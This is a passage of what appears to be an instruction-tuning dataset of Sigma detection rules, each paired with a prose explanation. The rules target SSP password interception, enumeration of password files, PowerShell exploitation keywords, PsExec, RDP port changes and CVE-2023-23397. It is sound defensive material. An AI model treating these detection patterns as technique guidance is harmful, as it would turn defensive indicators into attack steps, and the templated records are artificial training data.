      "answer": "In order to detect service creation persistence used by the Goofy Guineapig backdoor, you should focus on monitoring Windows system service logs for specific events that indicate potential malicious activity. Look for logs from the Service Control Manager with an Event ID of 7045. This event ID indicates a service was installed on the system. Pay special attention to any service named 'GoogleUpdate'. However, the critical aspect to look out for in identifying this specific backdoor is the path specified in the service's installation. If the ImagePath contains all the following sequences: 'rundll32', 'FileProtocolHandler', and includes a path that seems to be '\\ProgramData\\GoogleUpdate\\GoogleUpdate.exe', it suggests that the service being installed is not a legitimate Google Update service but is instead masquerading as one to gain persistence on the system. Given the specifics of the detection method, false positives are considered unlikely. The severity of this type of detection is marked as critical due to the potential impact of allowing backdoor access to persist on a compromised system through seemingly legitimate service creation."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting addition of a SSP to the registry. Upon a reboot or API call, SSP DLLs gain access to encrypted and plaintext passwords stored in Windows..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the addition of a Security Support Provider (SSP) to the registry, which, upon a reboot or API call, allows SSP DLLs to gain access to encrypted and plaintext passwords stored in Windows, you should monitor the Windows registry for changes specifically in the \"Security Packages\" entries located at 'HKLM\\System\\CurrentControlSet\\Control\\Lsa\\Security Packages' and 'HKLM\\System\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages'. It's critical to exclude any legitimate alterations made by Windows Installer processes, specifically those running from 'C:\\Windows\\system32\\msiexec.exe' and 'C:\\Windows\\syswow64\\MsiExec.exe', to reduce false positives. Given the critical level of this detection method, any modifications to these registry entries, excluding those made by the aforementioned Windows Installer paths, should be treated with high suspicion, as they are unlikely to be false positives and may indicate an attempt by attackers to intercept passwords.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: registry_event\n    product: windows\ndetection:\n    selection_registry:\n        TargetObject:\n            - 'HKLM\\System\\CurrentControlSet\\Control\\Lsa\\Security Packages'\n            - 'HKLM\\System\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages'\n    exclusion_images:\n        Image:\n            - 'C:\\Windows\\system32\\msiexec.exe'\n            - 'C:\\Windows\\syswow64\\MsiExec.exe'\n    condition: selection_registry and not exclusion_images\nfalsepositives:\n    - Unlikely\nlevel: critical\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: registry_event\n    product: windows\ndetection:\n    selection_registry:\n        TargetObject:\n            - 'HKLM\\System\\CurrentControlSet\\Control\\Lsa\\Security Packages'\n            - 'HKLM\\System\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages'\n    exclusion_images:\n        Image:\n            - 'C:\\Windows\\system32\\msiexec.exe'\n            - 'C:\\Windows\\syswow64\\MsiExec.exe'\n    condition: selection_registry and not exclusion_images\nfalsepositives:\n    - Unlikely\nlevel: critical\n",
      "question": "addition of a SSP to the registry. Upon a reboot or API call, SSP DLLs gain access to encrypted and plaintext passwords stored in Windows.",
      "answer": "In order to detect the addition of a Security Support Provider (SSP) to the registry, which, upon a reboot or API call, allows SSP DLLs to gain access to encrypted and plaintext passwords stored in Windows, you should monitor the Windows registry for changes specifically in the \"Security Packages\" entries located at 'HKLM\\System\\CurrentControlSet\\Control\\Lsa\\Security Packages' and 'HKLM\\System\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages'. It's critical to exclude any legitimate alterations made by Windows Installer processes, specifically those running from 'C:\\Windows\\system32\\msiexec.exe' and 'C:\\Windows\\syswow64\\MsiExec.exe', to reduce false positives. Given the critical level of this detection method, any modifications to these registry entries, excluding those made by the aforementioned Windows Installer paths, should be treated with high suspicion, as they are unlikely to be false positives and may indicate an attempt by attackers to intercept passwords."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting installation of NalDrv or PROCEXP152 services via registry-keys to non-system32 folders.\nBoth services are used in the tool Ghost-In-The-Logs (https://github.com/bats3c/Ghost-In-The-Logs), which uses KDU (https://github.com/hfiref0x/KDU)\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the installation of NalDrv or PROCEXP152 services via registry-keys to non-system32 folders, which are associated with the tool Ghost-In-The-Logs and uses KDU, monitored actions should include scanning for `SetValue` events within the Windows Registry, specifically targeting the `ImagePath` attributes of the `HKLM\\System\\CurrentControlSet\\Services\\NalDrv` and `HKLM\\System\\CurrentControlSet\\Services\\PROCEXP152` service keys. These events indicate an attempt to install or modify the path of a service, which can be a tactic used by attackers to execute malicious software.\n\nTo accurately identify malicious activity and reduce false positives, it's important to exclude any events where the `Image` path ends with known system utilities like `procexp64.exe`, `procexp.exe`, `procmon64.exe`, `procmon.exe`, `handle.exe`, or `handle64.exe`. Additionally, the presence of `Details` containing the path `\\WINDOWS\\system32\\Drivers\\PROCEXP152.SYS` should be excluded as this might indicate legitimate activity involving these tools. It's crucial to adapt the exclusion list to match the environment by adding full paths of legitimate utility usage to avoid misinterpretation.\n\nHowever, it's important to acknowledge that while this detection mechanism can identify certain malicious activities, it's not foolproof. Attackers can easily bypass this form of detection by renaming the services, indicating a medium level of confidence in this detection strategy. Therefore, reliance solely on this method is not recommended without cross-checking with additional detection mechanisms or behavioral analysis to confirm malicious intent.\n\nThis approach focuses on identifying specific tactics and techniques associated with initial access and execution, as these services being installed to non-standard directories can be indicative of an attacker's attempt to gain persistence or execute malicious payloads outside of typical system scrutiny.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject:\n            - 'HKLM\\System\\CurrentControlSet\\Services\\NalDrv\\ImagePath'\n            - 'HKLM\\System\\CurrentControlSet\\Services\\PROCEXP152\\ImagePath'\n    filter:\n        Image|endswith:\n            # Please add the full paths that you use in your environment to tighten the rule\n            - '\\procexp64.exe'\n            - '\\procexp.exe'\n            - '\\procmon64.exe'\n            - '\\procmon.exe'\n            - '\\handle.exe'\n            - '\\handle64.exe'\n        Details|contains: '\\WINDOWS\\system32\\Drivers\\PROCEXP152.SYS'\n    condition: selection and not filter\nfalsepositives:\n    - Other legimate tools using this service names and drivers. Note - clever attackers may easily bypass this detection by just renaming the services. Therefore just Medium-level and don't rely on it.\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject:\n            - 'HKLM\\System\\CurrentControlSet\\Services\\NalDrv\\ImagePath'\n            - 'HKLM\\System\\CurrentControlSet\\Services\\PROCEXP152\\ImagePath'\n    filter:\n        Image|endswith:\n            # Please add the full paths that you use in your environment to tighten the rule\n            - '\\procexp64.exe'\n            - '\\procexp.exe'\n            - '\\procmon64.exe'\n            - '\\procmon.exe'\n            - '\\handle.exe'\n            - '\\handle64.exe'\n        Details|contains: '\\WINDOWS\\system32\\Drivers\\PROCEXP152.SYS'\n    condition: selection and not filter\nfalsepositives:\n    - Other legimate tools using this service names and drivers. Note - clever attackers may easily bypass this detection by just renaming the services. Therefore just Medium-level and don't rely on it.\nlevel: medium\n",
      "question": "installation of NalDrv or PROCEXP152 services via registry-keys to non-system32 folders.\nBoth services are used in the tool Ghost-In-The-Logs (https://github.com/bats3c/Ghost-In-The-Logs), which uses KDU (https://github.com/hfiref0x/KDU)\n",
      "answer": "In order to detect the installation of NalDrv or PROCEXP152 services via registry-keys to non-system32 folders, which are associated with the tool Ghost-In-The-Logs and uses KDU, monitored actions should include scanning for `SetValue` events within the Windows Registry, specifically targeting the `ImagePath` attributes of the `HKLM\\System\\CurrentControlSet\\Services\\NalDrv` and `HKLM\\System\\CurrentControlSet\\Services\\PROCEXP152` service keys. These events indicate an attempt to install or modify the path of a service, which can be a tactic used by attackers to execute malicious software.\n\nTo accurately identify malicious activity and reduce false positives, it's important to exclude any events where the `Image` path ends with known system utilities like `procexp64.exe`, `procexp.exe`, `procmon64.exe`, `procmon.exe`, `handle.exe`, or `handle64.exe`. Additionally, the presence of `Details` containing the path `\\WINDOWS\\system32\\Drivers\\PROCEXP152.SYS` should be excluded as this might indicate legitimate activity involving these tools. It's crucial to adapt the exclusion list to match the environment by adding full paths of legitimate utility usage to avoid misinterpretation.\n\nHowever, it's important to acknowledge that while this detection mechanism can identify certain malicious activities, it's not foolproof. Attackers can easily bypass this form of detection by renaming the services, indicating a medium level of confidence in this detection strategy. Therefore, reliance solely on this method is not recommended without cross-checking with additional detection mechanisms or behavioral analysis to confirm malicious intent.\n\nThis approach focuses on identifying specific tactics and techniques associated with initial access and execution, as these services being installed to non-standard directories can be indicative of an attacker's attempt to gain persistence or execute malicious payloads outside of typical system scrutiny."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious child process spawning from Outlook where the image is located in a remote location (SMB/WebDav shares)..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect a suspicious child process spawning from Outlook where the image is located in a remote location (SMB/WebDav shares), you should monitor the creation of processes on Windows systems, particularly focusing on those instances where Outlook appears to be the parent application launching these processes. Specifically, look for cases where the child process (the executable image being launched) has its path starting with double backslashes `\\\\`, which typically indicates access to network resources, such as SMB or WebDAV shares. This scenario could signify a potentially malicious activity, where Outlook is being used to execute code from a remote location, possibly as part of a phishing attack or another form of compromise. Given the high risk associated with such behavior, it is marked with a high level of alert, although it's important to acknowledge that there could be unknown scenarios where this behavior might be legitimate.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\outlook.exe'\n        Image|startswith: '\\\\\\\\'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\outlook.exe'\n        Image|startswith: '\\\\\\\\'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "suspicious child process spawning from Outlook where the image is located in a remote location (SMB/WebDav shares).",
      "answer": "In order to detect a suspicious child process spawning from Outlook where the image is located in a remote location (SMB/WebDav shares), you should monitor the creation of processes on Windows systems, particularly focusing on those instances where Outlook appears to be the parent application launching these processes. Specifically, look for cases where the child process (the executable image being launched) has its path starting with double backslashes `\\\\`, which typically indicates access to network resources, such as SMB or WebDAV shares. This scenario could signify a potentially malicious activity, where Outlook is being used to execute code from a remote location, possibly as part of a phishing attack or another form of compromise. Given the high risk associated with such behavior, it is marked with a high level of alert, although it's important to acknowledge that there could be unknown scenarios where this behavior might be legitimate."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Adversaries may carry out malicious operations using a virtual instance to avoid detection.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect adversaries carrying out malicious operations using a virtual instance to avoid detection, you should: Monitor Windows PowerShell Script Block Logging for certain commands indicative of virtual machine manipulation. Specifically, look for the execution of PowerShell commands such as `New-VM`, `Set-VMFirmware`, and `Start-VM`, which are related to the creation, configuration, and starting of virtual machines respectively. This activity requires that Script Block Logging is enabled on the system to capture PowerShell command execution. Be aware of potential legitimate uses of these PowerShell scripts, as they may lead to false positives. The detection of such activity is categorized under a medium threat level.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains:\n            - New-VM\n            - Set-VMFirmware\n            - Start-VM\n    condition: selection\nfalsepositives:\n    - Legitimate PowerShell scripts\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains:\n            - New-VM\n            - Set-VMFirmware\n            - Start-VM\n    condition: selection\nfalsepositives:\n    - Legitimate PowerShell scripts\nlevel: medium\n",
      "question": "Adversaries may carry out malicious operations using a virtual instance to avoid detection",
      "answer": "In order to detect adversaries carrying out malicious operations using a virtual instance to avoid detection, you should: Monitor Windows PowerShell Script Block Logging for certain commands indicative of virtual machine manipulation. Specifically, look for the execution of PowerShell commands such as `New-VM`, `Set-VMFirmware`, and `Start-VM`, which are related to the creation, configuration, and starting of virtual machines respectively. This activity requires that Script Block Logging is enabled on the system to capture PowerShell command execution. Be aware of potential legitimate uses of these PowerShell scripts, as they may lead to false positives. The detection of such activity is categorized under a medium threat level."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Detect adversaries enumerate sensitive files.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect adversaries enumerating sensitive files, you should: Monitor Windows PowerShell script activities, specifically focusing on script block logging which must be enabled for accurate detection. Look for scripts containing commands like 'ls', 'get-childitem', or 'gci' indicating an intention to list directory contents. Further scrutiny should be applied to scripts attempting to use the '-recurse' option, indicating a deeper, possibly malicious directory traversal. Pay special attention to scripts that seem to search for sensitive file types, such as '.pass', '.kdbx', or '.kdb', as this could signify an attempt to locate and potentially compromise crucial data. The detection should be considered genuine if all the mentioned conditions are met, acknowledging the possibility of unknown false positives at a medium severity level.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection_action:\n        ScriptBlockText|contains:\n            - ls\n            - get-childitem\n            - gci\n    selection_recurse:\n        ScriptBlockText|contains: '-recurse'\n    selection_file:\n        ScriptBlockText|contains:\n            - '.pass'\n            - '.kdbx'\n            - '.kdb'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection_action:\n        ScriptBlockText|contains:\n            - ls\n            - get-childitem\n            - gci\n    selection_recurse:\n        ScriptBlockText|contains: '-recurse'\n    selection_file:\n        ScriptBlockText|contains:\n            - '.pass'\n            - '.kdbx'\n            - '.kdb'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "Detect adversaries enumerate sensitive files",
      "answer": "In order to detect adversaries enumerating sensitive files, you should: Monitor Windows PowerShell script activities, specifically focusing on script block logging which must be enabled for accurate detection. Look for scripts containing commands like 'ls', 'get-childitem', or 'gci' indicating an intention to list directory contents. Further scrutiny should be applied to scripts attempting to use the '-recurse' option, indicating a deeper, possibly malicious directory traversal. Pay special attention to scripts that seem to search for sensitive file types, such as '.pass', '.kdbx', or '.kdb', as this could signify an attempt to locate and potentially compromise crucial data. The detection should be considered genuine if all the mentioned conditions are met, acknowledging the possibility of unknown false positives at a medium severity level."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Remote desktop is a common feature in operating systems.\nIt allows a user to log into an interactive session with a system desktop graphical user interface on a remote system.\nMicrosoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect unauthorized modifications targeting the registry setting that defines the port number for Remote Desktop Services (RDS), which is Microsoft's implementation of the Remote Desktop Protocol, enabling a user to log into an interactive session with a system's desktop graphical user interface from a remote system, you should monitor Windows registry settings for any SetValue events that alter the TargetObject located at \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\\PortNumber\". This indicates an attempt to change the port used by RDP, potentially as part of an effort to bypass security controls or hide malicious activity by using non-standard ports. The detection strategy should exclude the modification events where the Details attribute equals \"DWORD (0x00000d3d)\", as this represents a known configuration and may not indicate malicious activity. However, other modifications to this registry value could be indicative of unauthorized attempts to alter RDP settings, warranting a high alert level. It is noted that there may be unknown false positives, suggesting cautious interpretation of alerts. This monitoring effort relates to tactics and techniques such as Defense Evasion and Persistence, aiming to identify potential security breaches involving remote desktop protocols.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject: HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\\PortNumber\n    filter:\n        Details: DWORD (0x00000d3d)\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject: HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\\PortNumber\n    filter:\n        Details: DWORD (0x00000d3d)\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "Remote desktop is a common feature in operating systems.\nIt allows a user to log into an interactive session with a system desktop graphical user interface on a remote system.\nMicrosoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).\n",
      "answer": "In order to detect unauthorized modifications targeting the registry setting that defines the port number for Remote Desktop Services (RDS), which is Microsoft's implementation of the Remote Desktop Protocol, enabling a user to log into an interactive session with a system's desktop graphical user interface from a remote system, you should monitor Windows registry settings for any SetValue events that alter the TargetObject located at \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\\PortNumber\". This indicates an attempt to change the port used by RDP, potentially as part of an effort to bypass security controls or hide malicious activity by using non-standard ports. The detection strategy should exclude the modification events where the Details attribute equals \"DWORD (0x00000d3d)\", as this represents a known configuration and may not indicate malicious activity. However, other modifications to this registry value could be indicative of unauthorized attempts to alter RDP settings, warranting a high alert level. It is noted that there may be unknown false positives, suggesting cautious interpretation of alerts. This monitoring effort relates to tactics and techniques such as Defense Evasion and Persistence, aiming to identify potential security breaches involving remote desktop protocols."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting potentially suspicious keywords that could indicate the use of a PowerShell exploitation framework.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect potentially suspicious keywords that could indicate the use of a PowerShell exploitation framework, you should: focus on monitoring PowerShell script activities within Windows environments where Script Block Logging is enabled. Specifically, look for the presence of any of these indicative keywords or phrases within the script text: usage of 'System.Reflection.Assembly.Load($', '[System.Reflection.Assembly]::Load($', '[Reflection.Assembly]::Load($' for dynamically loading assemblies, references to 'System.Reflection.AssemblyName' for dealing with assembly names, 'Reflection.Emit.AssemblyBuilderAccess' and 'Reflection.Emit.CustomAttributeBuilder' that are associated with the creation of assemblies and custom attributes at runtime, 'Runtime.InteropServices.UnmanagedType' and 'Runtime.InteropServices.DllImportAttribute' related to invoking unmanaged code, 'SuspendThread' indicating potential thread manipulation, and 'rundll32', a utility that can be used maliciously to execute code. It's important to be vigilant about these indicators as they might be employed in crafting PowerShell-based exploits, although be aware that there can be legitimate uses of these terms, so unknown false positives can occur. The detection is of a medium risk level, suggesting that while these indicators are not definitively malicious on their own, their presence warrants further investigation.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains:\n            - 'System.Reflection.Assembly.Load($'\n            - '[System.Reflection.Assembly]::Load($'\n            - '[Reflection.Assembly]::Load($'\n            - 'System.Reflection.AssemblyName'\n            - 'Reflection.Emit.AssemblyBuilderAccess'\n            - 'Reflection.Emit.CustomAttributeBuilder'\n            - 'Runtime.InteropServices.UnmanagedType'\n            - 'Runtime.InteropServices.DllImportAttribute'\n            - 'SuspendThread'\n            - 'rundll32'\n            # - 'FromBase64'\n            #- 'Invoke-WMIMethod' # Prone to FP\n            #- 'http://127.0.0.1' # Prone to FP\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains:\n            - 'System.Reflection.Assembly.Load($'\n            - '[System.Reflection.Assembly]::Load($'\n            - '[Reflection.Assembly]::Load($'\n            - 'System.Reflection.AssemblyName'\n            - 'Reflection.Emit.AssemblyBuilderAccess'\n            - 'Reflection.Emit.CustomAttributeBuilder'\n            - 'Runtime.InteropServices.UnmanagedType'\n            - 'Runtime.InteropServices.DllImportAttribute'\n            - 'SuspendThread'\n            - 'rundll32'\n            # - 'FromBase64'\n            #- 'Invoke-WMIMethod' # Prone to FP\n            #- 'http://127.0.0.1' # Prone to FP\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "potentially suspicious keywords that could indicate the use of a PowerShell exploitation framework",
      "answer": "In order to detect potentially suspicious keywords that could indicate the use of a PowerShell exploitation framework, you should: focus on monitoring PowerShell script activities within Windows environments where Script Block Logging is enabled. Specifically, look for the presence of any of these indicative keywords or phrases within the script text: usage of 'System.Reflection.Assembly.Load($', '[System.Reflection.Assembly]::Load($', '[Reflection.Assembly]::Load($' for dynamically loading assemblies, references to 'System.Reflection.AssemblyName' for dealing with assembly names, 'Reflection.Emit.AssemblyBuilderAccess' and 'Reflection.Emit.CustomAttributeBuilder' that are associated with the creation of assemblies and custom attributes at runtime, 'Runtime.InteropServices.UnmanagedType' and 'Runtime.InteropServices.DllImportAttribute' related to invoking unmanaged code, 'SuspendThread' indicating potential thread manipulation, and 'rundll32', a utility that can be used maliciously to execute code. It's important to be vigilant about these indicators as they might be employed in crafting PowerShell-based exploits, although be aware that there can be legitimate uses of these terms, so unknown false positives can occur. The detection is of a medium risk level, suggesting that while these indicators are not definitively malicious on their own, their presence warrants further investigation."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting launch of the PSEXESVC service, which means that this system was the target of a psexec remote execution.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the launch of the PSEXESVC service, which means that this system was the target of a psexec remote execution, you should: Monitor process creation logs on Windows systems for instances where the PSEXESVC.exe file, specifically located at C:\\Windows\\PSEXESVC.exe and bearing the original file name 'psexesvc.exe', is initiated. This detection helps in identifying potential malicious usage of the PsExec tool for remote execution, which could indicate a system compromise. Bear in mind, however, that the detection can generate alerts for legitimate administrative tasks that also use PsExec, hence such activities are considered as potential false positives and the alert level is set at medium.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image: 'C:\\Windows\\PSEXESVC.exe'\n        - OriginalFileName: 'psexesvc.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate administrative tasks\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image: 'C:\\Windows\\PSEXESVC.exe'\n        - OriginalFileName: 'psexesvc.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate administrative tasks\nlevel: medium\n",
      "question": "launch of the PSEXESVC service, which means that this system was the target of a psexec remote execution",
      "answer": "In order to detect the launch of the PSEXESVC service, which means that this system was the target of a psexec remote execution, you should: Monitor process creation logs on Windows systems for instances where the PSEXESVC.exe file, specifically located at C:\\Windows\\PSEXESVC.exe and bearing the original file name 'psexesvc.exe', is initiated. This detection helps in identifying potential malicious usage of the PsExec tool for remote execution, which could indicate a system compromise. Bear in mind, however, that the detection can generate alerts for legitimate administrative tasks that also use PsExec, hence such activities are considered as potential false positives and the alert level is set at medium."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting mount of ISO images on an endpoint.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the mount of ISO images on an endpoint, you should monitor Windows Security audit logs specifically for events related to the access of removable storage. Focus on capturing events identified by EventID 4663, indicating an object's access attempt. These logs should come from the Security ObjectServer and involve FileType objects. Particularly, pay attention to access attempts involving objects whose names start with '\\Device\\CdRom', as this indicates the interaction with CD-ROM devices, typically used to read ISO images.\n\nHowever, not all access events to CD-ROM devices should be considered suspicious. For instance, accessing the '\\Device\\CdRom0\\setup.exe' path is excluded from detection criteria because it's commonly accessed during legitimate software installations via ISO files. Therefore, while monitoring for the described activities, filter out events involving this specific path to reduce false positives such as those triggered by software installation ISO files.\n\nThis monitoring process is essential for identifying unauthorized or unexpected mount of ISO images, which could be indicative of an attack attempt or unauthorized data retrieval. It's assessed at a medium level of importance due to its potential to catch malicious activities early. Keep an eye out for events meeting these criteria, as they are aligned with the detection of misuse of removable media which relates to several ATT&CK tactics and techniques including Initial Access, Execution, and Persistence, among others.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: security\n    definition: 'The advanced audit policy setting \"Object Access > Audit Removable Storage\" must be configured for Success/Failure'\ndetection:\n    selection:\n        EventID: 4663\n        ObjectServer: 'Security'\n        ObjectType: 'File'\n        ObjectName|startswith: '\\Device\\CdRom'\n    filter:\n        ObjectName: '\\Device\\CdRom0\\setup.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Software installation ISO files\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: security\n    definition: 'The advanced audit policy setting \"Object Access > Audit Removable Storage\" must be configured for Success/Failure'\ndetection:\n    selection:\n        EventID: 4663\n        ObjectServer: 'Security'\n        ObjectType: 'File'\n        ObjectName|startswith: '\\Device\\CdRom'\n    filter:\n        ObjectName: '\\Device\\CdRom0\\setup.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Software installation ISO files\nlevel: medium\n",
      "question": "mount of ISO images on an endpoint",
      "answer": "In order to detect the mount of ISO images on an endpoint, you should monitor Windows Security audit logs specifically for events related to the access of removable storage. Focus on capturing events identified by EventID 4663, indicating an object's access attempt. These logs should come from the Security ObjectServer and involve FileType objects. Particularly, pay attention to access attempts involving objects whose names start with '\\Device\\CdRom', as this indicates the interaction with CD-ROM devices, typically used to read ISO images.\n\nHowever, not all access events to CD-ROM devices should be considered suspicious. For instance, accessing the '\\Device\\CdRom0\\setup.exe' path is excluded from detection criteria because it's commonly accessed during legitimate software installations via ISO files. Therefore, while monitoring for the described activities, filter out events involving this specific path to reduce false positives such as those triggered by software installation ISO files.\n\nThis monitoring process is essential for identifying unauthorized or unexpected mount of ISO images, which could be indicative of an attack attempt or unauthorized data retrieval. It's assessed at a medium level of importance due to its potential to catch malicious activities early. Keep an eye out for events meeting these criteria, as they are aligned with the detection of misuse of removable media which relates to several ATT&CK tactics and techniques including Initial Access, Execution, and Persistence, among others."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting changes to the registry values related to outlook that indicates that a reminder was triggered for a Note or Task item. This could be a sign of exploitation of CVE-2023-23397. Further investigation is required to determine the success of an exploitation..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect changes to the registry values related to outlook that indicates that a reminder was triggered for a Note or Task item, which could be a sign of exploitation of CVE-2023-23397, you should: Monitor the Windows Registry for modifications. Specifically, focus on registry sets associated with Microsoft Office and Outlook, especially those changes made to the Tasks and Notes sections. These modifications are identified by the 'SetValue' event type in the registry logs. It's important to note that sometimes legitimate actions, like receiving reminders for tasks or notes, can also trigger this monitoring condition, so these instances are considered low-level alerts and require further investigation to confirm any actual exploitation attempt.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        TargetObject|contains|all:\n            - '\\SOFTWARE\\Microsoft\\Office\\'\n            - '\\Outlook\\'\n        TargetObject|contains:\n            - '\\Tasks\\'\n            - '\\Notes\\'\n        EventType: SetValue\n    condition: selection\nfalsepositives:\n    - Legitimate reminders received for a task or a note will also trigger this rule.\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        TargetObject|contains|all:\n            - '\\SOFTWARE\\Microsoft\\Office\\'\n            - '\\Outlook\\'\n        TargetObject|contains:\n            - '\\Tasks\\'\n            - '\\Notes\\'\n        EventType: SetValue\n    condition: selection\nfalsepositives:\n    - Legitimate reminders received for a task or a note will also trigger this rule.\nlevel: low\n",
      "question": "changes to the registry values related to outlook that indicates that a reminder was triggered for a Note or Task item. This could be a sign of exploitation of CVE-2023-23397. Further investigation is required to determine the success of an exploitation.",
      "answer": "In order to detect changes to the registry values related to outlook that indicates that a reminder was triggered for a Note or Task item, which could be a sign of exploitation of CVE-2023-23397, you should: Monitor the Windows Registry for modifications. Specifically, focus on registry sets associated with Microsoft Office and Outlook, especially those changes made to the Tasks and Notes sections. These modifications are identified by the 'SetValue' event type in the registry logs. It's important to note that sometimes legitimate actions, like receiving reminders for tasks or notes, can also trigger this monitoring condition, so these instances are considered low-level alerts and require further investigation to confirm any actual exploitation attempt."
    }
  },
  {
